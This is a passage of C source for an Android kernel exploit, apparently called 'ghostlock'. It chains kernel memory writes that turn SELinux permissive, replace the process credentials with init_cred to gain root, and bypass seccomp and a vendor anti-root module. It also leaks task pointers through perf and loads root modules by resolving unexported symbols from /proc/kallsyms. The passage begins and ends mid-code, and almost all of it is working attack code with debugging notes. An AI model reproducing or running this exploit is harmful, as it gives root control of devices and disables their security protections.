      "        APKO=\"/data/adb/ap/${KMI}_kernelpatch.ko\"\n"
      "      elif ls /data/local/tmp/*kernelpatch*.ko >/dev/null 2>&1; then\n"
      "        APKO=$(ls /data/local/tmp/*kernelpatch*.ko 2>/dev/null | head -1)\n"
      "        echo \"[*] using staged module $APKO\" >>\"$LOG\"\n"
      "      fi\n"
      "# KernelSU family (SukiSU/ReSukiSU/KowSU) route: ksud + kernelsu.ko.\n"
      "# Preferred over APatch: ksud loads via the standard init_module path and\n"
      "# does NOT rewrite the running SELinux policy, so system_server survives.\n"
      "      if [ -x /data/local/tmp/ksud ] && [ -f /data/local/tmp/kernelsu.ko ]; then\n"
      "        KSUN_PKG=\"${GHOSTLOCK_KSUN_PKG:-com.sukisu.ultra}\"\n"
      "        cp /data/local/tmp/kernelsu.ko /data/adb/ksud.ko 2>/dev/null\n"
      "        echo \"[*] KernelSU route: ksud late-load pkg=$KSUN_PKG kmi=$KMI\" >>\"$LOG\"\n"
      "        /data/local/tmp/ksud late-load --kmi \"$KMI\" --package-name \"$KSUN_PKG\" --allow-shell >>\"$LOG\" 2>&1\n"
      "        echo \"[*] ksud late-load exit=$?\" >>\"$LOG\"\n"
      "      elif [ -n \"$APKO\" ]; then\n"
      "        # WHY NOT PLAIN insmod (measured 2026-09-11, /dev/kmsg):\n"
      "        # kernelpatch.ko references 13 symbols that this 5.10.149 GKI does\n"
      "        # NOT export, so ksymtab resolution fails and init_module returns\n"
      "        # ENOENT. toybox insmod then prints 'No such file or directory' even\n"
      "        # though the file exists:\n"
      "        #   kernelpatch: Unknown symbol kallsyms_lookup_name (err -2)\n"
      "        #   ... __set_fixmap copy_to_kernel_nofault __flush_dcache_area\n"
      "        #   kernel_read iterate_dir prepare_kernel_cred commit_creds\n"
      "        #   find_get_task_by_vpid prepare_creds abort_creds\n"
      "        #   security_secctx_to_secid __put_cred\n"
      "        # apd's `insmod` subcommand does userspace ELF relocation: it reads\n"
      "        # /proc/kallsyms, rewrites every SHN_UNDEF symbol to SHN_ABS with the\n"
      "        # kallsyms address (apd/src/insmod.rs, ported from KernelSU ksuinit),\n"
      "        # then calls init_module. Neither ksymtab nor modversions is consulted.\n"
      "        # It also does NOT touch SELinux policy, unlike `late-load` (whose\n"
      "        # apply_magisk_policy_live replaces the whole policy and leaves the\n"
      "        # running services unlabeled -> system_server dies).\n"
      "        if [ \"$GHOSTLOCK_INSMOD_ONLY_BAKED\" = \"1\" ]; then\n"
      "          echo '[*] mode=apd-insmod (kallsyms relocation, policy untouched)' >>\"$LOG\"\n"
      "          \"$KSUD\" insmod \"$APKO\" >>\"$LOG\" 2>&1\n"
      "          IRC=$?\n"
      "          echo \"[*] apd insmod rc=$IRC\" >>\"$LOG\"\n"
      "          if [ \"$IRC\" -ne 0 ]; then\n"
      "            echo '[*] apd insmod failed; falling back to raw insmod' >>\"$LOG\"\n"
      "            insmod \"$APKO\" >>\"$LOG\" 2>&1\n"
      "            echo \"[*] raw insmod rc=$?\" >>\"$LOG\"\n"
      "          fi\n"
      "        else\n"
      "          \"$KSUD\" late-load --module \"$APKO\" --package-name me.bmax.apatch >>\"$LOG\" 2>&1\n"
      "        fi\n"
      "      else\n"
      "        echo \"[!] no kernelpatch .ko staged; put it at /data/adb/ap/${KMI}_kernelpatch.ko\" >>\"$LOG\"\n"
      "        \"$KSUD\" late-load --kmi \"$KMI\" >>\"$LOG\" 2>&1\n"
      "      fi\n"
      "      ;;\n"
      "    *)\n"
      "      \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
      "      ;;\n"
      "  esac\n"
      "  LL_RC=$?\n"
      "  echo \"[*] late-load exit=$LL_RC\" >>\"$LOG\"\n"
      "  # Capture the kernel's own view of the load attempt. The only snapshot on\n"
      "  # this path used to be taken BEFORE the module was handed to the kernel,\n"
      "  # so the previous run's 13 'Unknown symbol ... (err -2)' lines never made\n"
      "  # it into any log -- that blind spot cost a whole wrong-root-cause cycle.\n"
      "  dmesg > \"$HOME_DIR/.ghostlock_dmesg2.log\" 2>/dev/null\n"
      "  echo \"[*] post-load dmesg: $(wc -c < \"$HOME_DIR/.ghostlock_dmesg2.log\" 2>/dev/null) bytes\" >>\"$LOG\"\n"
      "fi\n"
      "echo \"[*] temp su uid=$(id -u); watching kernelsu/kernelpatch module\" >>\"$LOG\"\n"
      "KSU_READY=0\n"
      "for i in $(seq 1 50); do\n"
      "  if grep -qE 'kernelsu|kernelpatch' /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
      "  sleep 0.1\n"
      "done\n"
      "if [ \"$KSU_READY\" -ne 1 ]; then\n"
      "  echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
      "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
      "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
      "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
      "fi\n"
      "else\n"
      "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
      "fi\n",
      g_home_dir, v_skipfix, v_insmod);
  if (n < 0 || n >= (int)sizeof(script)) {
    pr_warning("root script too long\n");
    close(sfd);
    return;
  }
  if (write(sfd, script, (size_t)n) != n) {
    pr_warning("write root script failed errno=%d\n", errno);
  }
  /* fsync BEFORE exec. Measured on-device: without it, the script was read
   * back as 9255 bytes of blank filler -- the write was still sitting in the
   * page cache when the cred swap / system state changed, so the shell saw
   * an empty script, exited immediately, and neither the log nor insmod ever
   * ran. Push everything to disk first. */
  if (fsync(sfd) != 0) {
    pr_warning("fsync root script failed errno=%d\n", errno);
  }
  close(sfd);
  /* f2fs here is mounted fsync_mode=nobarrier: fsync() alone does not
   * guarantee the bytes reach flash. A crash right after this (which is
   * exactly what SELF-W2 risks) then leaves the file at its declared size
   * filled with blanks -- measured: 9884/9255 bytes of spaces, so the shell
   * read an empty script and exited. sync() forces the whole fs, and the
   * short settle gives f2fs' background GC a chance to finish. */
  sync();
  usleep(200000);
  chmod(g_root_script_path, 0755);
  sync();
}

/* ---- File-backed log -----------------------------------------------------
 * printf() to stdout is FULLY buffered once adb redirects it to a file, so
 * every message in the final block -- including the "execl failed" warning --
 * was still sitting in the buffer when the device went down. Hit #1 (10:19)
 * and hit #2 (10:32) both ended with the script on disk and ZERO diagnostics.
 * Anything that must survive a crash goes through klog() instead. */
#define KPATCH_LOG "/data/local/tmp/.ghostlock_klog"
/* A second copy on /sdcard. The /data/local/tmp file IS written and fsynced,
 * but the shell user cannot read it back -- it is created from the kernel
 * SELinux domain, so `cat` returns Permission denied (measured). /sdcard
 * proved openable from this process (probe: open(/sdcard)=131 errno=0), and
 * /sdcard survives the reboot and is readable by adb shell. */
#define KPATCH_LOG2 "/sdcard/ghostlock_klog"

static void klog_write(const char *path, const char *buf, size_t n) {
  int fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0666);
  if (fd < 0) return;
  ssize_t w = write(fd, buf, n);
  (void)w;
  /* f2fs is fsync_mode=nobarrier: without this the file vanishes with the
   * crash that always follows a successful module load (observed 3x). */
  fsync(fd);
  close(fd);
}

static void klog(const char *fmt, ...) {
  char buf[512];
  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  if (n <= 0) return;
  if (n > (int)sizeof(buf) - 1) n = (int)sizeof(buf) - 1;
  klog_write(KPATCH_LOG, buf, (size_t)n);
  klog_write(KPATCH_LOG2, buf, (size_t)n);
}

/* ---- Load kernelpatch.ko the way APatch's apd does -----------------------
 * A plain finit_module lets the KERNEL resolve the module's SHN_UNDEF symbols
 * against its own __ksymtab. kernelpatch.ko needs 13 symbols this 5.10.149 GKI
 * does not export -- kallsyms_lookup_name, __set_fixmap, copy_to_kernel_nofault,
 * __flush_dcache_area, kernel_read, iterate_dir, prepare_kernel_cred,
 * commit_creds, find_get_task_by_vpid, prepare_creds, abort_creds,
 * security_secctx_to_secid, __put_cred -- so it fails with ENOENT, which toybox
 * renders as "No such file or directory" (this cost a whole wrong-root-cause
 * cycle). apd/src/insmod.rs works around it by rewriting every undefined symbol
 * to SHN_ABS with the address taken from /proc/kallsyms and only then calling
 * init_module; the kernel never consults __ksymtab. Reimplemented here.
 *
 * Runs IN THIS PROCESS on purpose. The rb_erase side write lands on
 * init_cred+8, which IS the gid field (measured gid=-276807936 == low 32 bits
 * of task+0x780), so exec()ing a shell re-initialises cred from a poisoned
 * template. Observed twice: the root script landed on disk byte-perfect and
 * executable, yet /data/local/tmp/.ghostlock_ksu.log was never created.
 */
static int kpatch_relocate_and_load(const char *ko_path) {
  int kr = open("/proc/sys/kernel/kptr_restrict", O_WRONLY);
  if (kr >= 0) {
    ssize_t w = write(kr, "1", 1);
    (void)w;
    close(kr);
  }

  int fd = open(ko_path, O_RDONLY);
  if (fd < 0) { klog("open(%s) failed errno=%d\n", ko_path, errno); return -1; }
  struct stat st;
  if (fstat(fd, &st) != 0 || st.st_size < (off_t)sizeof(Elf64_Ehdr)) {
    klog("fstat failed errno=%d\n", errno);
    close(fd);
    return -1;
  }
  size_t size = (size_t)st.st_size;
  unsigned char *buf = (unsigned char *)malloc(size);
  if (!buf) { close(fd); return -1; }
  size_t got = 0;
  while (got < size) {
    ssize_t n = read(fd, buf + got, size - got);
    if (n <= 0) break;
    got += (size_t)n;
  }
  close(fd);
  if (got != size) { klog("short read %zu/%zu\n", got, size); free(buf); return -1; }

  Elf64_Ehdr *eh = (Elf64_Ehdr *)buf;
  if (memcmp(eh->e_ident, ELFMAG, SELFMAG) != 0 ||
      eh->e_ident[EI_CLASS] != ELFCLASS64 ||
      eh->e_shoff == 0 || eh->e_shnum == 0) {
    klog("bad ELF header\n");
    free(buf);
    return -1;
  }

  Elf64_Shdr *sh = (Elf64_Shdr *)(buf + eh->e_shoff);
  Elf64_Sym *syms = NULL;
  const char *strs = NULL;
  size_t nsym = 0;
  for (int i = 0; i < eh->e_shnum; i++) {
    if (sh[i].sh_type == SHT_SYMTAB && sh[i].sh_entsize == sizeof(Elf64_Sym) &&
        sh[i].sh_link < eh->e_shnum) {
      syms = (Elf64_Sym *)(buf + sh[i].sh_offset);
      strs = (const char *)(buf + sh[sh[i].sh_link].sh_offset);
      nsym = (size_t)(sh[i].sh_size / sizeof(Elf64_Sym));
      break;
    }
  }
  if (!syms || !strs || nsym == 0) { klog("no symtab\n"); free(buf); return -1; }

  enum { MAXU = 256 };
  Elf64_Sym *undef[MAXU];
  const char *uname[MAXU];
  int nu = 0;
  for (size_t i = 1; i < nsym && nu < MAXU; i++) {
    if (syms[i].st_shndx != SHN_UNDEF) continue;
    const char *nm = strs + syms[i].st_name;
    if (!nm[0]) continue;
    undef[nu] = &syms[i];
    uname[nu] = nm;
    nu++;
  }
  klog("undefined=%d\n", nu);

  FILE *kf = fopen("/proc/kallsyms", "r");
  if (!kf) { klog("open /proc/kallsyms errno=%d\n", errno); free(buf); return -1; }
  char line[512];
  int resolved = 0;
  while (resolved < nu && fgets(line, sizeof(line), kf)) {
    unsigned long long addr = 0;
    char type = 0;
    char name[256];
    if (sscanf(line, "%llx %c %255s", &addr, &type, name) != 3) continue;
    if (addr == 0) continue;
    for (int i = 0; i < nu; i++) {
      if (!uname[i]) continue;
      if (strcmp(uname[i], name) != 0) continue;
      undef[i]->st_shndx = SHN_ABS;
      undef[i]->st_value = (Elf64_Addr)addr;
      uname[i] = NULL;
      resolved++;
      break;
    }
  }
  fclose(kf);
  klog("resolved=%d/%d\n", resolved, nu);

  errno = 0;
  long rc = syscall(__NR_init_module, buf, size, "");
  int e = errno;
  klog("init_module rc=%ld errno=%d\n", rc, e);
  free(buf);
  return rc == 0 ? 0 : -e;
}

static int kernelsu_module_loaded(void) {
  FILE *modules = fopen("/proc/modules", "r");
  if (!modules) return 0;

  char line[256];
  int loaded = 0;
  while (fgets(line, sizeof(line), modules)) {
    char name[64];
    if (sscanf(line, "%63s", name) == 1 && strcmp(name, "kernelsu") == 0) {
      loaded = 1;
      break;
    }
  }
  fclose(modules);
  return loaded;
}

/* Find a task through perf sample records. */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("perf_event_open failed errno=%d\n", errno);
    return 0;
  }
  /* Ring buffer sizing matters far more than it looks. Each sample carries
   * 32 registers (~272 bytes with headers), so the old 32-page ring held only
   * ~481 samples -- while 500000 getpid calls were requested. ~99.9% of the
   * samples were dropped and the "vote" we then took was computed over the
   * 256-entry candidate cap, which is why votes came out at 48-51/256 with no
   * separation between the real task pointer and noise. W2's write target is
   * derived from this leak (child_task + TASK_CRED_OFF), so a wrong pick means
   * writing init_cred into random kernel memory -> instant panic. Sized up to
   * 256 pages (~3800 samples retained) and a 8192-entry candidate pool. */
  size_t msz = 4096 * (1 + 256);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_warning("perf mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 256;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[8192]; int nc = 0;
  while (pos < head && nc < 8192) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 8192; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

/* rooted exits kfree the static init_cred (w2 stores it with no
 * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
static void park_rooted_child(void) {
  FILE *f = fopen("/proc/self/oom_score_adj", "w");
  if (f) {
    fputs("-1000", f);
    fclose(f);
  }
  for (;;) pause();
}

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  setpgid(0, 0);  /* own group; the parent kills the whole tree on timeout */
  fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* keep the probe pipe out of the
                                          * root shell / ksud chain */
  prctl(PR_SET_NAME, "ghostleaf_0123456789");
  /* a real leak reproduces, a fluke vote winner does not. w2 writes to
   * this address, so runs must agree or the leak is discarded. The old check
   * accepted any two consecutive agreements, which a systematic sampling bias
   * can fake; take 3 samples and require a majority instead. W2's target is
   * child_task + TASK_CRED_OFF, so a wrong leak writes init_cred into random
   * kernel memory and panics instantly. */
  uintptr_t t[3] = {0, 0, 0};
  for (int i = 0; i < 3; i++) t[i] = perf_find_task();
  uintptr_t my_task = 0;
  if (t[0] && t[0] == t[1])
    my_task = t[0];
  else if (t[0] && t[0] == t[2])
    my_task = t[0];
  else if (t[1] && t[1] == t[2])
    my_task = t[1];
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task) _exit(1);
  char cmd;
  while (1) {
    /* Self-watch: W2 swaps our cred for init_cred. The parent's pipe
     * round-trip turned out to be the fragile link -- measured repeatedly,
     * the parent read -1 (child already gone) even on runs where the pselect
     * itself survived. So watch our own uid and launch the root script the
     * instant we turn root, instead of waiting to be asked. poll() with a
     * short timeout keeps the original command channel intact while never
     * sleeping more than a few ms past the cred swap. */
    if (getuid() == 0) {
      execl("/system/bin/sh", "sh", g_root_script_path, NULL);
      _exit(0);
    }
    struct pollfd cpfd = { .fd = p->cmd_r, .events = POLLIN };
    if (poll(&cpfd, 1, 5) <= 0) continue;
    if (read(p->cmd_r, &cmd, 1) != 1) break;
    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
    else if (cmd == 'F') {
      /* Forked finit_module probe after W3 cleared TIF_SECCOMP and
       * seccomp.mode: mode==2 re-arms TIF_SECCOMP on fork (probe hits the
       * filter); mode==0 lets it run filter-free to a normal errno. Forked
       * so SIGSYS costs only this. */
      uint32_t code = 0xffffffff;
      int probe_pipe[2];
      if (pipe(probe_pipe) == 0) {
        pid_t probe = fork();
        if (probe == 0) {
          close(probe_pipe[0]);
          /* Forked probe: keep default SIGSYS so the filter kills it. */
          signal(SIGSYS, SIG_DFL);
          errno = 0;
          long r = syscall(__NR_finit_module, 0, 0, 0);
          uint32_t out = (r == 0) ? 0 : (uint32_t)errno;
          ssize_t nw = write(probe_pipe[1], &out, sizeof(out));
          (void)nw;
          _exit(0);
        }
        close(probe_pipe[1]);
        int st = 0;
        if (waitpid(probe, &st, 0) == probe && WIFEXITED(st)) {
          ssize_t nr = read(probe_pipe[0], &code, sizeof(code));
          if (nr != (ssize_t)sizeof(code)) code = 0xfffffffe;
        } else {
          code = 0xfffffffd; /* probe killed by a signal (SIGSYS) */
        }
        close(probe_pipe[0]);
      }
      write(p->uid_w, &code, sizeof(code));
    }
    else if (cmd == 'M') {
      /* Report comm length + first byte to tell which side a leaf=1 write
       * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
       * [target+8] len 8, untouched len 15. */
      char comm[24] = {0};
      FILE *cf = fopen("/proc/self/comm", "r");
      if (cf) {
        size_t n = fread(comm, 1, sizeof(comm) - 1, cf);
        (void)n;
        fclose(cf);
      }
      size_t len = strlen(comm);
      while (len > 0 && comm[len - 1] == '\n') {
        comm[len - 1] = 0;
        len--;
      }
      uint32_t report =
        ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
      write(p->uid_w, &report, sizeof(report));
    }
    else if (cmd == 'P') {
      /* w2 rooted this task; park */
      close(p->cmd_r);
      close(p->uid_w);
      park_rooted_child();
    }
    else if (cmd == 'G' || cmd == 'X') break;
  }
  close(p->cmd_r);
  if (getuid() != 0) { close(p->uid_w); _exit(1); }
  /* Don't leak app-side fds into the root shell chain: ksud/zygisk
   * daemons must not keep their write ends open. */
  for (int fd = 3; fd < 1024; fd++) {
    int fl = fcntl(fd, F_GETFD);
    if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
  }
  pid_t worker = fork();
  if (worker == 0) {
    /* Detach into a brand-new session: the independent root shell owns the
     * whole chain (ksud late-load + module watch) and must survive the
     * exploit parent killing this group on timeout. */
    if (setsid() < 0) _exit(1);
    execl("/system/bin/sh", "sh", g_root_script_path, NULL);
    _exit(1);
  }
  if (worker < 0) {
    pr_warning("fork() for root shell failed errno=%d; parking rooted child\n", errno);
    close(p->uid_w);
    park_rooted_child();
  }
  /* the worker holds a fresh cred copy; this task holds the raw init_cred */
  close(p->uid_w);
  park_rooted_child();
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

/* Fork the victim and read back the task pointer perf leaked. */
static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
  pid_t child = spawn_child(p);
  if (child < 0) return -1;
  uintptr_t task = 0;
  ssize_t nr = read(p->task_r, &task, sizeof(task));
  close(p->task_r);
  *task_out = (nr == (ssize_t)sizeof(task)) ? task : 0;
  return child;
}

typedef int (*write_stage_verify_fn)(void *context);

static int retry_write_stage(
    const char *stage, uintptr_t target, int mode, int attempts,
    useconds_t settle_usec, write_stage_verify_fn verify, void *context,
    int leaf) {
  for (int attempt = 1; attempt <= attempts; attempt++) {
    pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
    /* the previous attempt's write can land after its verify read; check
     * before paying for another heap spray */
    if (attempt > 1 && verify(context)) return 1;
    if (attempt == 1) slab_drain();
    int routed = do_one_write(target, stage, mode, leaf);
    if (!routed) {
      pr_warning("%s attempt %d route failed; backing off\n", stage, attempt);
      usleep(100000);
      continue;
    }
    if (settle_usec) usleep(settle_usec);
    if (verify(context)) return 1;
    usleep(50000);
  }
  /* the last write can land after its verify read */
  return verify(context);
}

static int verify_selinux_stage(void *context) {
  (void)context;
  if (!check_selinux_off()) return 0;
  pr_success("SELinux permissive\n");
  return 1;
}

static int verify_self_stage(void *context) {
  (void)context;
  /* Parent-side verification. W2 now targets OUR OWN task->cred, so the
   * observable is our own uid -- no child, no pipe, no round-trip. The pipe
   * path was the single fragile link: measured repeatedly, the parent read
   * -1 (child already gone) even when the pselect itself survived, so the
   * root script never started. */
  if (getuid() == 0) {
    pr_success("self is root (uid 0)!\n");
    return 1;
  }
  return 0;
}

struct w2_stage_context {
  struct child_pipes *pipes;
};

struct w3_stage_context {
  struct child_pipes *pipes;
  int leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
};

static int verify_w2_stage(void *context) {
  struct w2_stage_context *stage = context;
  pr_info("W2 verify: probing child\n");
  if (write(stage->pipes->cmd_w, "C", 1) != 1) {
    pr_warning("W2 verify: cmd write failed errno=%d\n", errno);
    return 0;
  }

  uint32_t child_uid = 9999;
  ssize_t n = read(stage->pipes->uid_r, &child_uid, sizeof(child_uid));
  if (n != (ssize_t)sizeof(child_uid)) {
    pr_warning("W2 verify: uid read returned %zd (0 = child died / oopsed)\n", n);
    return 0;
  }
  pr_info("child uid = %u\n", child_uid);
  if (child_uid != 0) return 0;
  pr_success("child is root!\n");
  return 1;
}

static int verify_seccomp_probe_stage(void *context) {
  struct w2_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "F", 1) != 1) return 0;

  uint32_t code = 0;
  if (read(stage->pipes->uid_r, &code, sizeof(code)) !=
      (ssize_t)sizeof(code)) {
    return 0;
  }
  pr_info("seccomp finit_module probe = 0x%x\n", code);
  /* SIGSYS (0xfffffffd) = filter kills; EPERM/ENOSYS = its RET_ERRNO actions.
   * With init_cred + permissive SELinux a real probe fails with a normal
   * errno instead. */
  if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
      code == 1 || code == 38) {
    return 0;
  }
  pr_success("child seccomp filter bypassed (finit_module errno=%u)\n", code);
  return 1;
}

static int verify_leaf_dir_stage(void *context) {
  struct w3_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "M", 1) != 1) return 0;

  uint32_t report = 0;
  if (read(stage->pipes->uid_r, &report, sizeof(report)) !=
      (ssize_t)sizeof(report)) {
    return 0;
  }
  size_t len = (report >> 8) & 0xff;
  unsigned char c0 = (unsigned char)(report & 0xff);
  pr_info("leaf dir probe comm_len=%u comm[0]=%02x\n", (unsigned)len, c0);
  if (len == 8) {
    stage->leaf_to_target8 = 1;
    pr_info("leaf=1 write lands on [target+8]\n");
    return 1;
  }
  if (len == 0) {
    stage->leaf_to_target8 = 0;
    pr_info("leaf=1 write lands on [target]\n");
    return 1;
  }
  if (len == 15) {
    pr_warning("leaf dir probe: comm untouched (write missed the comm field)\n");
    return 0;
  }
  pr_warning("leaf dir probe ambiguous (len=%u c0=%02x)\n", (unsigned)len, c0);
  return 0;
}

/* Park /dev/null on the low file descriptors.
 *
 * The pselect fd_set words double as waiter fields, so each word's *value*
 * also becomes a fd bitmap. W1's value is our mapped page (e.g. ...0100):
 * low byte 0x00, so only fds >= 8 are set. W2's value is init_cred
 * (e.g. ...0930): low byte 0x30, which additionally sets fd 4 and fd 5.
 * open_selected_fds() dup2()s a never-ready descriptor over EVERY set fd, so
 * W2 silently redirects whatever resource lives at fd 4/5 -- exactly where
 * the exploit's earliest harness pipes/socketpairs land. That is the one
 * structural difference between W1 and W2 (identical word layout, shift and
 * mechanism), and it matches the measurement: W1 survives ~20-27%, W2 is
 * 0/30. Parking descriptors on the low fds pushes every later allocation out
 * of the bitmap's reach. */
static int g_fd_park[128];
static void reserve_low_fds(void) {
  int n = 0;
  for (int i = 0; i < (int)(sizeof(g_fd_park) / sizeof(g_fd_park[0])); i++) {
    int fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
    if (fd < 0) break;
    if (fd <= 2) {
      close(fd);
      break;
    }
    g_fd_park[n++] = fd;
  }
  pr_info("reserved %d low fds (later allocations start above %d)\n", n,
          n ? g_fd_park[n - 1] : 2);
}

int run_exploit(int argc, char **argv) {
  (void)argc; (void)argv;
  disable_rseq_for_thread();
  set_unbuffer();
  signal(SIGPIPE, SIG_IGN);
  set_limit();
  reserve_low_fds();
  init_cpu_config();
  init_runtime_paths();
  write_root_script();

  if (!active_offsets && select_offsets() < 0) return 1;

  log_startup_context();
  init_p0_profile();
  pin_to_core(CORE);
  pr_info("main thread running on cpu=%d\n", sched_getcpu());

  timer_reset();
  TIMER("exploit start");

  /* W1: disable SELinux before task discovery. untrusted_app may not be able
   * to read enforce while it is still enforcing, so attempt W1 regardless. */
  int selinux_ok = check_selinux_off();
  if (!selinux_ok) {
    if (!enforce_readable()) {
      pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
    }
    TIMER("pre-W1 drain");
    int w1_attempts = 15;
    {
      const char *wa = getenv("GHOSTLOCK_W1_ATTEMPTS");
      if (wa && *wa) {
        int v = atoi(wa);
        if (v >= 1 && v <= 15) w1_attempts = v;
      }
    }
    selinux_ok = retry_write_stage(
        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, w1_attempts, 100000,
        verify_selinux_stage, NULL, 0);
    if (!selinux_ok) {
      pr_warning("Write 1 failed\n");
      return 1;
    }
    TIMER("Write 1 complete");
  } else {
    pr_success("SELinux already permissive\n");
  }

  /* W2: overwrite the child credential via the task leaked by perf. */
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  struct w2_stage_context w2_context = { .pipes = &pipes };
  pid_t child = -1;
  uintptr_t child_task = 0;
  int child_alive = 1;
  int seccomp_ok = 0;
  int ever_rooted = 0;
  pid_t parked_child = -1;
  int parked_cmd_w = -1;

  /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
   * child, so respawn and redo. */
  for (int round = 1; round <= 3; round++) {
    if (round > 1) {
      pr_warning("W3 chain retry %d/3: parking rooted child\n", round);
      if (child > 0 && child_alive) {
        write(pipes.cmd_w, "P", 1);
        usleep(50000);
        parked_child = child;
        parked_cmd_w = pipes.cmd_w;
      } else {
        close(pipes.cmd_w);
      }
      close(pipes.uid_r);
      child_alive = 1;
      seccomp_ok = 0;
    }

    child = spawn_victim(&pipes, &child_task);
    if (child < 0) {
      pr_warning("fork failed\n");
      return 1;
    }
    TIMER("perf_find_task done");

    if (!child_task) {
      /* nothing rooted yet; safe to kill and burn a round */
      pr_warning("perf leak did not reproduce; retrying next round\n");
      kill(-child, SIGKILL);
      waitpid(child, NULL, 0);

      child_alive = 0;
      close(pipes.cmd_w); close(pipes.uid_r);
      continue;

    }

    pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
    #ifdef VR_TAG_A_OFF
  /* ------------------------------------------------------------------
   * vivo vr.ko anti-root per-task bypass (ported from root.c)
   * ------------------------------------------------------------------
   * vr.ko tags every app-origin task at fork/clone time. When the task
   * later holds euid 0, the sys_exit tracepoint probe kills it. We must
   * strip the tag BEFORE W2 verify runs the child's getuid().
   *
   * This exploit primitive is 64-bit granular, so:
   *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
   *     clears the VR_SYSCALL_TP_FLAG bit (0x400). This takes the task
   *     off the sys_exit slow-path immediately.
   *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
   *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
   *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
   * ------------------------------------------------------------------ */
  {
    static int vr_needed = -1;
    if (vr_needed < 0) {
      vr_needed = 1; /* /proc/modules unreadable: assume loaded */
      FILE *m = fopen("/proc/modules", "r");
      if (m) {
        char mod[256];
        vr_needed = 0;
        while (fgets(mod, sizeof(mod), m))
          if (!strncasecmp(mod, "vr", 2) && (mod[2] == ' ' || mod[2] == '_'))
            { vr_needed = 1; break; }
        fclose(m);
      }
      pr_info("vr.ko %s\n", vr_needed ? "loaded; clearing tags"
                                      : "not loaded; skipping tag clear");
    }

